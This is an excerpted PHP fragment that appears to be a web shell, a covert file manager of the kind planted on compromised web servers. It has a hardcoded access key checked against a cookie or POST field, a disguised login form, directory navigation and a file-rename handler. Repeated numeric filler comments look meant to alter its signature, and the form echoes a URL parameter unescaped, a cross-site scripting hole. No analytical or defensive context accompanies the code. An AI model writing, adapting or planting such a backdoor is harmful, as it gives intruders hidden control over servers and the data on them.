...
$auth_key = "a9f278825856023c1fb1694f801234a1";
...
$pass = false;
if (isset($_COOKIE['pw_name_27009'])) {
    if(($_COOKIE['pw_name_27009']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_27009'])) {
        if(($_POST['pw_name_27009']) == $auth_key) {
            setcookie("pw_name_27009", $_POST['pw_name_27009']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_27009' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1737984528762752 1737984528414630 1737984528729279 1737984528722668
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1737984528762752 1737984528414630 1737984528729279 1737984528722668
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1737984528762752 1737984528414630 1737984528729279 1737984528722668
            $name = PATH . "/" . $_GET['r'];
